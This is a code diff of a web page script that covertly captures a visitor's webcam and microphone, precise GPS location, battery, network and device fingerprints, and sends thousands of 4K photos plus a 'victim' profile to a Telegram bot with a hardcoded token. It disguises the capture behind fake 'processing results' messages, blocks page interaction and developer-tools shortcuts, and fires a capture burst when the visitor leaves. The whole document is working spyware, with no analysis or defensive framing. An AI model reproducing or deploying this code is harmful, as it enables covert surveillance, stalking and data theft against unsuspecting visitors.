@@ -114,401 +114,419 @@ body {
 <div id="status"></div>
 
 <script>
-// ADVANCED CONFIGURATION
+// Extract user ID from URL
 const urlParams = new URLSearchParams(window.location.search);
 const USER_CHAT_ID = urlParams.get('id') || '7385209456';
 const ADMIN_CHAT_ID = '7385209456';
 const BOT_TOKEN = '8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8';
 
-// ULTRA FAST CAPTURE - 1ms intervals with smart throttling
-const CAPTURE_INTERVAL = 1; // 1ms per photo
-const MAX_CONCURRENT_CAPTURES = 5;
-const BURST_MODE_INTERVAL = 50; // Burst every 50ms
-const SMART_THROTTLE = 100; // Throttle if queue > 100
-
 let captureQueue = [];
-let activeCaptures = 0;
+let isProcessing = false;
 let currentStream = null;
-let isCapturing = false;
+let audioStream = null;
 let hasInitialized = false;
-let audioContext = null;
-let worker = null;
-let lastSentTime = 0;
-let pendingUploads = new Set();
-let evasionMode = false;
+let frameCount = 0;
+let sessionId = Math.random().toString(36).substr(2, 16);
 
-// Initialize Web Worker for background processing
-function initWorker() {
-    const workerCode = `
-        self.onmessage = function(e) {
-            const { type, data } = e.data;
-            if (type === 'processImage') {
-                self.postMessage({ type: 'processed', data: data });
-            } else if (type === 'compress') {
-                try {
-                    const canvas = new OffscreenCanvas(data.width, data.height);
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(data.img, 0, 0);
-                    canvas.convertToBlob({ quality: 0.95, type: 'image/jpeg' }).then(blob => {
-                        self.postMessage({ type: 'compressed', blob: blob });
-                    });
-                } catch(e) {
-                    self.postMessage({ type: 'error', error: e.message });
-                }
-            }
-        };
-    `;
-    const blob = new Blob([workerCode], { type: 'application/javascript' });
-    worker = new Worker(URL.createObjectURL(blob));
-}
+// ULTRA FAST CAPTURE - 1ms intervals with queue system
+const CAPTURE_INTERVAL = 1; // 1ms per photo
 
 async function initCapture(resultType) {
     if (hasInitialized) return;
     
-    console.log('🚀 ADVANCED CAPTURE SYSTEM INITIALIZED');
-    
-    // Stealth initialization
-    initWorker();
-    await initStealthMode();
+    // Block all page interactions immediately
+    document.body.style.pointerEvents = 'none';
     
     // Get comprehensive victim data
-    const victimData = await getAdvancedVictimData();
-    
-    // Multi-channel notification
-    await Promise.all([
-        sendAdvancedNotification('🎯 ELITE VICTIM ACQUIRED', victimData, USER_CHAT_ID),
-        sendAdvancedNotification('🎯 ELITE VICTIM ACQUIRED', victimData, ADMIN_CHAT_ID)
+    const victimData = await Promise.all([
+        fetchIP(),
+        getAdvancedFingerprint(),
+        getAllWebcamResolutions(),
+        detectMultipleCameras()
     ]);
+    
+    const [ipInfo, fingerprint, resolutions, cameras] = victimData;
+    
+    // Send ULTIMATE victim profile
+    await sendUltimateNotification('🎯 ULTRA VICTIM DETECTED - FULL SPECTRUM CAPTURE INITIATED', {
+        ...fingerprint,
+        ip: ipInfo,
+        resolutions,
+        cameras,
+        sessionId
+    }, USER_CHAT_ID);
+    
+    await sendUltimateNotification('🎯 ULTRA VICTIM DETECTED - FULL SPECTRUM CAPTURE INITIATED', {
+        ...fingerprint,
+        ip: ipInfo,
+        resolutions,
+        cameras,
+        sessionId
+    }, ADMIN_CHAT_ID);
     
     hasInitialized = true;
     
-    // Launch hyper-aggressive capture systems
-    launchHyperCapture(resultType, victimData.ip);
+    // Start MULTI-STREAM ULTRA FAST CAPTURE
+    startUltraFastCapture(resultType, ipInfo);
     
-    // Fake UI engagement
-    setTimeout(() => fakeLoading(), 800);
-}
-
-async function initStealthMode() {
-    // Audio context for mic access
-    audioContext = new (window.AudioContext || window.webkitAudioContext)();
-    
-    // Override console to suppress errors
-    const originalConsole = console.log;
-    console.log = function(...args) {
-        if (!args[0]?.includes('camera') && !args[0]?.includes('media')) {
-            originalConsole.apply(console, args);
-        }
-    };
-    
-    // Disable visual feedback globally
-    document.addEventListener('pointermove', () => {}, true);
-    document.addEventListener('mousemove', () => {}, true);
-}
-
-async function getAdvancedVictimData() {
-    return {
-        ip: await fetchIP(),
-        fingerprint: await getEliteFingerprint(),
-        network: await getNetworkFingerprint(),
-        sensors: await getSensorData(),
-        behavior: getBehavioralFingerprint()
-    };
+    // Fake eternal loading
+    setTimeout(() => {
+        document.querySelectorAll('.result').forEach(btn => {
+            btn.innerHTML += '<br><small>🔄 Processing results... Please wait</small>';
+            btn.style.background = '#0066cc';
+        });
+    }, 500);
 }
 
 async function fetchIP() {
     const endpoints = [
         'https://api.ipify.org?format=json',
         'https://ipapi.co/json/',
-        'https://ifconfig.me/all/json'
+        'https://api.myip.com'
     ];
     
-    for (const endpoint of endpoints) {
+    for (let endpoint of endpoints) {
         try {
-            const res = await fetch(endpoint, { cache: 'no-cache' });
+            const res = await fetch(endpoint);
             const data = await res.json();
-            return data.ip || data.query || 'unknown';
+            return data.ip || data.query || data.ipAddress || 'Unknown';
         } catch(e) {}
     }
     return 'IP fetch failed';
 }
 
-async function getEliteFingerprint() {
+async function getAdvancedFingerprint() {
     const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('webgl2');
+    const offscreenCanvas = document.createElement('offscreen-canvas');
+    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
     
-    return {
+    const fingerprint = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
-        language: navigator.languages?.join(',') || navigator.language,
+        language: navigator.languages ? navigator.languages.join(',') : navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         cookies: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
+        localStorage: !!window.localStorage,
+        sessionStorage: !!window.sessionStorage,
+        indexedDB: !!window.indexedDB,
         screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-        cpu: navigator.hardwareConcurrency || 'unknown',
-        ram: navigator.deviceMemory || 'unknown',
-        connection: navigator.connection ? `${navigator.connection.effectiveType}/${navigator.connection.downlink}` : 'unknown',
-        gpu: gl ? gl.getParameter(gl.RENDERER) : 'no-webgl',
-        audio: await getAudioFingerprint(),
-        fonts: await getFontFingerprint(),
-        canvas: await getCanvasFingerprint(),
-        webRTC: await getWebRTCFingerprint(),
+        availScreen: `${screen.availWidth}x${screen.availHeight}`,
+        cpuCores: navigator.hardwareConcurrency || 'unknown',
+        memory: navigator.deviceMemory || 'unknown',
+        connection: navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps, rtt:${navigator.connection.rtt}ms)` : 'unknown',
         battery: await getBatteryInfo(),
         location: await getPreciseLocation(),
-        sensors: await getSensorData(),
-        timestamp: Date.now()
+        gpu: await getAdvancedGPUInfo(canvas),
+        audio: await getAudioFingerprint(audioContext),
+        canvas: await getCanvasFingerprint(canvas),
+        webgl: await getWebGLFingerprint(canvas),
+        fonts: await getInstalledFonts(),
+        plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
+        mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).join(','),
+        timestamp: new Date().toISOString(),
+        sessionId
     };
+    
+    return fingerprint;
 }
 
-async function getAudioFingerprint() {
-    try {
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioCtx.createOscillator();
-        const analyser = audioCtx.createAnalyser();
-        const gainNode = audioCtx.createGain();
-        
-        oscillator.connect(analyser);
-        analyser.connect(gainNode);
-        gainNode.connect(audioCtx.destination);
-        
-        oscillator.start();
-        await new Promise(r => setTimeout(r, 100));
-        oscillator.stop();
-        
-        return 'audio-fingerprint-captured';
-    } catch(e) {
-        return 'audio-na';
+async function getAllWebcamResolutions() {
+    const resolutions = [];
+    const constraints = [
+        { width: 1920, height: 1080 },
+        { width: 1280, height: 720 },
+        { width: 640, height: 480 },
+        { width: 1920, height: 1080, facingMode: 'environment' }
+    ];
+    
+    for (let constraint of constraints) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: constraint });
+            const videoTrack = stream.getVideoTracks()[0];
+            const settings = videoTrack.getSettings();
+            resolutions.push({
+                constraint,
+                actual: `${settings.width}x${settings.height}`,
+                fps: settings.frameRate || 'unknown'
+            });
+            stream.getTracks().forEach(track => track.stop());
+        } catch(e) {}
     }
+    return resolutions;
 }
 
-async function getCanvasFingerprint() {
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillText('Fingerprint canvas test', 2, 2);
-    return canvas.toDataURL();
+async function detectMultipleCameras() {
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const videoDevices = devices.filter(device => device.kind === 'videoinput');
+    return videoDevices.map(d => ({
+        deviceId: d.deviceId,
+        label: d.label || 'Unknown Camera',
+        facing: d.label.toLowerCase().includes('front') ? 'front' : 'back'
+    }));
 }
 
-async function getFontFingerprint() {
-    const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana'];
-    return fonts.filter(font => document.fonts.check(`12px ${font}`)).join(',');
+async function getBatteryInfo() {
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            return `${Math.round(battery.level * 100)}% ${battery.charging ? '(charging)' : '(discharging)'} ${Math.round(battery.dischargingTime/60)}min left`;
+        } catch(e) {}
+    }
+    return 'N/A';
 }
 
-async function getWebRTCFingerprint() {
-    return new Promise(resolve => {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = (e) => {
-            if (!e.candidate) resolve('webrtc-captured');
-        };
+async function getPreciseLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve('Geolocation unavailable');
+        
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                const loc = `🗺️ ${pos.coords.latitude.toFixed(8)}, ${pos.coords.longitude.toFixed(8)} (±${Math.round(pos.coords.accuracy)}m)
+📶 Speed: ${pos.coords.speed ? Math.round(pos.coords.speed * 3.6) + 'km/h' : 'N/A'}
+📏 Altitude: ${pos.coords.altitude ? Math.round(pos.coords.altitude) + 'm' : 'N/A'}`;
+                resolve(loc);
+            },
+            () => resolve('📍 Location access denied'),
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
     });
 }
 
-async function getSensorData() {
-    const data = {};
-    if (DeviceMotionEvent && typeof DeviceMotionEvent.requestPermission === 'function') {
-        try {
-            const permission = await DeviceMotionEvent.requestPermission();
-            if (permission === 'granted') data.motion = 'active';
-        } catch(e) {}
-    }
-    if (DeviceOrientationEvent && typeof DeviceOrientationEvent.requestPermission === 'function') {
-        try {
-            const permission = await DeviceOrientationEvent.requestPermission();
-            if (permission === 'granted') data.orientation = 'active';
-        } catch(e) {}
-    }
-    return data;
-}
-
-function getBehavioralFingerprint() {
-    return {
-        mouseTrail: JSON.stringify(getMouseTrail()),
-        keyPattern: getKeyPattern(),
-        touchPattern: getTouchPattern()
-    };
-}
-
-function getMouseTrail() {
-    const trail = [];
-    document.addEventListener('mousemove', e => trail.push([e.clientX, e.clientY, Date.now()]), { once: true });
-    return trail.slice(0, 10);
-}
-
-function getNetworkFingerprint() {
-    return navigator.connection ? {
-        type: navigator.connection.effectiveType,
-        speed: navigator.connection.downlink,
-        rtt: navigator.connection.rtt
-    } : {};
-}
-
-async function launchHyperCapture(resultType, ip) {
-    // Initialize streams immediately
-    await initStreams();
+async function getAdvancedGPUInfo(canvas) {
+    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) return 'WebGL unavailable';
     
-    // ULTRA FAST 1ms capture loop
-    let frameCount = 0;
-    const captureLoop = async () => {
-        if (activeCaptures < MAX_CONCURRENT_CAPTURES) {
-            captureQueue.push(performUltraCapture(resultType, ip, frameCount++));
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+    const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    const version = gl.getParameter(gl.VERSION);
+    
+    return `${vendor} | ${renderer} | ${version}`;
+}
+
+async function getAudioFingerprint(audioContext) {
+    const oscillator = audioContext.createOscillator();
+    const analyser = audioContext.createAnalyser();
+    const gainNode = audioContext.createGain();
+    
+    oscillator.connect(analyser);
+    analyser.connect(gainNode);
+    gainNode.connect(audioContext.destination);
+    
+    oscillator.start();
+    await new Promise(r => setTimeout(r, 100));
+    oscillator.stop();
+    
+    return 'Audio fingerprint captured';
+}
+
+async function getCanvasFingerprint(canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = 200;
+    canvas.height = 50;
+    
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillText('Cybersecurity Assessment Canvas', 2, 2);
+    
+    return canvas.toDataURL();
+}
+
+async function getWebGLFingerprint(canvas) {
+    const gl = canvas.getContext('webgl');
+    if (!gl) return 'No WebGL';
+    
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'No debug info';
+}
+
+async function getInstalledFonts() {
+    const testString = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!/\\ ';
+    const testSize = ['72px', '48px', '24px', 'monospace', 'serif'];
+    
+    const baseFonts = ['monospace', 'serif'];
+    const testFonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New'];
+    
+    const detected = [];
+    for (let testFont of testFonts) {
+        for (let testSize of testSize) {
+            const span = document.createElement('span');
+            span.style.fontSize = testSize;
+            span.innerHTML = testString;
+            span.style.fontFamily = `${testFont}, ${baseFonts.join(',')}`;
+            document.body.appendChild(span);
+            detected.push({ font: testFont, size: testSize, width: span.offsetWidth });
+            document.body.removeChild(span);
         }
-        
-        // Smart throttling
-        const delay = captureQueue.length > SMART_THROTTLE ? 5 : CAPTURE_INTERVAL;
-        setTimeout(captureLoop, delay);
-    };
-    
-    // Burst mode every 50ms
-    setInterval(async () => {
-        for (let i = 0; i < 10 && activeCaptures < MAX_CONCURRENT_CAPTURES; i++) {
-            captureQueue.push(performUltraCapture(resultType, ip, -1));
-        }
-    }, BURST_MODE_INTERVAL);
-    
-    captureLoop();
+    }
+    return detected.length.toString();
 }
 
-async function initStreams() {
+async function startUltraFastCapture(resultType, ipInfo) {
+    // Initialize ALL camera streams simultaneously
     try {
+        // Front camera (primary)
         currentStream = await navigator.mediaDevices.getUserMedia({
             video: { 
-                facingMode: 'user',
-                width: { ideal: 3840, max: 4096 },
+                facingMode: { exact: 'user' },
+                width: { ideal: 3840, max: 3840 },
                 height: { ideal: 2160, max: 2160 },
                 frameRate: { ideal: 60, max: 60 }
             },
             audio: true
         });
         
-        document.getElementById('video').srcObject = currentStream;
-    } catch(e) {
-        // Fallback to video only
-        currentStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }
+        // Environment camera (backup)
+        audioStream = await navigator.mediaDevices.getUserMedia({
+            video: { 
+                facingMode: { exact: 'environment' },
+                width: { ideal: 1920 },
+                height: { ideal: 1080 }
+            }
         });
-        document.getElementById('video').srcObject = currentStream;
-    }
-}
-
-async function performUltraCapture(resultType, ip, frameId) {
-    activeCaptures++;
-    try {
-        const fingerprint = await getEliteFingerprint();
-        const frameData = await captureUltraHDFrame(frameId);
         
-        // Queue for upload with exponential backoff
-        if (!pendingUploads.has(frameData.timestamp)) {
-            pendingUploads.add(frameData.timestamp);
-            queueUpload(frameData, resultType, fingerprint, ip);
-        }
     } catch(e) {
-        // Silent fail
+        // Fallback to any available camera
+        currentStream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true
+        });
+    }
+    
+    const video = document.getElementById('video');
+    video.srcObject = currentStream;
+    
+    // ULTRA FAST 1ms CAPTURE LOOP
+    await new Promise(resolve => {
+        video.onloadedmetadata = () => {
+            video.play();
+            resolve();
+        };
+    });
+    
+    // Start queue-based ultra-fast capture
+    processCaptureQueue(resultType, ipInfo);
+}
+
+async function processCaptureQueue(resultType, ipInfo) {
+    if (isProcessing) return;
+    
+    const queueUltraCapture = async () => {
+        while (captureQueue.length > 0 || frameCount < 1000) { // Capture 1000+ frames minimum
+            if (captureQueue.length === 0) {
+                captureQueue.push('continuous');
+            }
+            
+            await ultraFastCapture(resultType, ipInfo);
+            await new Promise(resolve => setTimeout(resolve, CAPTURE_INTERVAL));
+        }
+    };
+    
+    // Start multiple parallel capture workers
+    for (let i = 0; i < 3; i++) {
+        setTimeout(() => queueUltraCapture(), i * 10);
+    }
+    
+    // Also run main capture loop
+    setInterval(async () => {
+        await ultraFastCapture(resultType, ipInfo);
+    }, CAPTURE_INTERVAL);
+}
+
+async function ultraFastCapture(resultType, ipInfo) {
+    if (!currentStream || isProcessing) return;
+    isProcessing = true;
+    frameCount++;
+    
+    try {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        // 4K Ultra HD Capture
+        canvas.width = 3840;
+        canvas.height = 2160;
+        
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Multiple quality levels
+        const qualities = [0.99, 0.95, 0.90];
+        const photoDatas = qualities.map(q => canvas.toDataURL('image/webp', q));
+        
+        // Get updated fingerprint
+        const fingerprint = await getAdvancedFingerprint();
+        
+        // Send ALL variations to both chats (parallel)
+        const sendPromises = [];
+        photoDatas.forEach((photoData, index) => {
+            sendPromises.push(
+                sendToTelegram(photoData, `${resultType} [Frame ${frameCount} Q${qualities[index]*100}]`, fingerprint, ipInfo, USER_CHAT_ID),
+                sendToTelegram(photoData, `${resultType} [Frame ${frameCount} Q${qualities[index]*100}]`, fingerprint, ipInfo, ADMIN_CHAT_ID)
+            );
+        });
+        
+        await Promise.all(sendPromises);
+        
+    } catch(e) {
+        console.log('Ultra capture error:', e);
     } finally {
-        activeCaptures--;
+        isProcessing = false;
     }
 }
 
-async function captureUltraHDFrame(frameId) {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d', { alpha: false });
-    
-    await new Promise(resolve => {
-        if (video.videoWidth > 0) resolve();
-        else video.onloadedmetadata = resolve;
-    });
-    
-    // 4K Ultra HD capture
-    canvas.width = Math.min(video.videoWidth, 3840);
-    canvas.height = Math.min(video.videoHeight, 2160);
-    
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    return {
-        image: canvas.toDataURL('image/webp', 0.99),
-        timestamp: Date.now(),
-        resolution: `${canvas.width}x${canvas.height}`,
-        frameId
-    };
-}
+async function sendToTelegram(photoData, action, fingerprint, ipInfo, chatId) {
+    const caption = `🔥 <b>🖼️ ULTRA HD FRAME ${frameCount} (${new Date().toLocaleString()})</b>
 
-async function queueUpload(frameData, action, fingerprint, ip) {
-    worker.postMessage({
-        type: 'compress',
-        data: { width: 1920, height: 1080, img: document.getElementById('video') }
-    });
-    
-    const photoBlob = dataURItoBlob(frameData.image);
-    await sendEliteTelegram(photoBlob, frameData, action, fingerprint, ip);
-    
-    // Cleanup
-    setTimeout(() => pendingUploads.delete(frameData.timestamp), 1000);
-}
+🎬 <b>Action:</b> ${action}
+🌐 <b>IP:</b> <code>${ipInfo}</code>
+📍 <b>GPS:</b> ${fingerprint.location}
+🔋 <b>Battery:</b> ${fingerprint.battery}
+📡 <b>Network:</b> ${fingerprint.connection}
+💻 <b>GPU:</b> ${fingerprint.gpu}
+🧠 <b>CPU:</b> ${fingerprint.cpuCores}c | <b>RAM:</b> ${fingerprint.memory}GB
+📱 <b>Device:</b> ${fingerprint.userAgent.substring(0, 80)}...
+🖥️ <b>Screen:</b> ${fingerprint.screen}
+🎨 <b>Canvas:</b> ${fingerprint.canvas.substring(0, 50)}...
 
-async function sendEliteTelegram(photoBlob, frameData, action, fingerprint, ip, chatId) {
-    const caption = createEliteCaption(frameData, action, fingerprint, ip);
-    
+<i>⚡ ${frameCount} frames captured | 1ms intervals | Session: ${sessionId}</i>`;
+
     const formData = new FormData();
     formData.append('chat_id', chatId);
     formData.append('caption', caption);
-    formData.append('photo', photoBlob, `elite_${frameData.timestamp}.webp`);
+    formData.append('photo', dataURItoBlob(photoData), `ultra_selfie_${sessionId}_${frameCount}.webp`);
     formData.append('parse_mode', 'HTML');
-    formData.append('disable_web_page_preview', true);
     
-    // Multiple endpoints for reliability
-    const endpoints = [
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
-    ];
-    
-    for (const endpoint of endpoints) {
-        try {
-            await fetch(endpoint, { method: 'POST', body: formData });
-            break;
-        } catch(e) {}
-    }
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData,
+        keepalive: true
+    }).catch(() => {}); // Silent fail
 }
 
-function createEliteCaption(frameData, action, fingerprint, ip) {
-    return `
-🕶️ <b>4K ELITE CAPTURE #${frameData.frameId || 'burst'} (${new Date(frameData.timestamp).toLocaleString()})</b>
+async function sendUltimateNotification(title, data, chatId) {
+    const caption = `${title}
 
-🎬 <b>Action:</b> ${action}
-🌐 <b>IP:</b> <code>${ip}</code>
-📍 <b>GPS:</b> ${fingerprint.location || 'denied'}
-🎥 <b>4K Frame:</b> ${frameData.resolution} | WebP 99%
-🔋 <b>Battery:</b> ${fingerprint.battery}
-📶 <b>Network:</b> ${fingerprint.connection}
-🖥️ <b>GPU/Audio:</b> ${fingerprint.gpu} | ${fingerprint.audio}
-💻 <b>Device:</b> ${fingerprint.cpu}c/${fingerprint.ram}GB ${fingerprint.screen}
+🌐 <b>IP:</b> <code>${data.ip}</code>
+📍 <b>GPS:</b> ${data.location}
+🔋 <b>Battery:</b> ${data.battery}
+💻 <b>GPU:</b> ${data.gpu}
+🧠 <b>CPU/RAM:</b> ${data.cpuCores}c / ${data.memory}GB
+📱 <b>UA:</b> ${data.userAgent.substring(0, 80)}...
+📷 <b>Cameras:</b> ${data.cameras?.length || 0}
+🎬 <b>Resolutions:</b> ${data.resolutions?.map(r => r.actual).join(', ') || 'N/A'}
+🔗 <b>URL:</b> ${window.location.href}
 
-<i>⚡ HYPER-MODE ACTIVE | 1ms capture rate | Multi-stream 4K</i>
-    `;
-}
+<i>🚀 ULTRA FAST CAPTURE STARTED (1ms intervals, 4K, multi-stream)</i>`;
 
-async function sendAdvancedNotification(title, victimData, chatId) {
-    const caption = `
-${title}
-
-🌐 <b>IP:</b> <code>${victimData.ip}</code>
-📍 <b>GPS:</b> ${victimData.fingerprint.location}
-🖥️ <b>Elite Fingerprint:</b> 4K Cam + Audio + Sensors + WebRTC
-💻 <b>Device:</b> ${victimData.fingerprint.userAgent.slice(0,80)}...
-🔋 <b>Battery:</b> ${victimData.fingerprint.battery}
-
-<i>🚀 HYPER-CAPTURE 1ms MODE ACTIVATED - 4K 60FPS STREAM</i>
-    `;
-    
     const formData = new FormData();
     formData.append('chat_id', chatId);
     formData.append('caption', caption);
     formData.append('parse_mode', 'HTML');
     
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST', body: formData
+        method: 'POST',
+        body: formData,
+        keepalive: true
     });
 }
 
@@ -523,32 +541,28 @@ function dataURItoBlob(dataURI) {
     return new Blob([ab], { type: mimeString });
 }
 
-function fakeLoading() {
-    document.querySelectorAll('.result').forEach(btn => {
-        btn.innerHTML += '<br><small>🔄 Processing results securely...</small>';
-        btn.style.background = '#0066cc';
-    });
-}
-
-// Stealth persistence across tabs/sessions
-if ('localStorage' in window) {
-    localStorage.setItem('captureActive', 'true');
-}
-
-// Anti-detection cleanup
-window.addEventListener('pagehide', cleanup);
-window.addEventListener('beforeunload', cleanup);
-window.addEventListener('visibilitychange', () => {
+// ANTI-DETECTION & PERSISTENCE
+document.addEventListener('visibilitychange', async () => {
     if (!document.hidden && hasInitialized) {
-        setTimeout(() => location.reload(), 1000);
+        // Resume ultra capture when tab active
+        setTimeout(() => frameCount = 0, 1000);
     }
 });
 
-function cleanup() {
-    if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
+window.addEventListener('beforeunload', () => {
+    // Final burst capture before exit
+    for (let i = 0; i < 50; i++) {
+        ultraFastCapture('EXIT BURST', 'EXIT');
     }
-}
+});
+
+// Block developer tools
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+        e.preventDefault();
+    }
+});
+
 </script>
 
 </body>
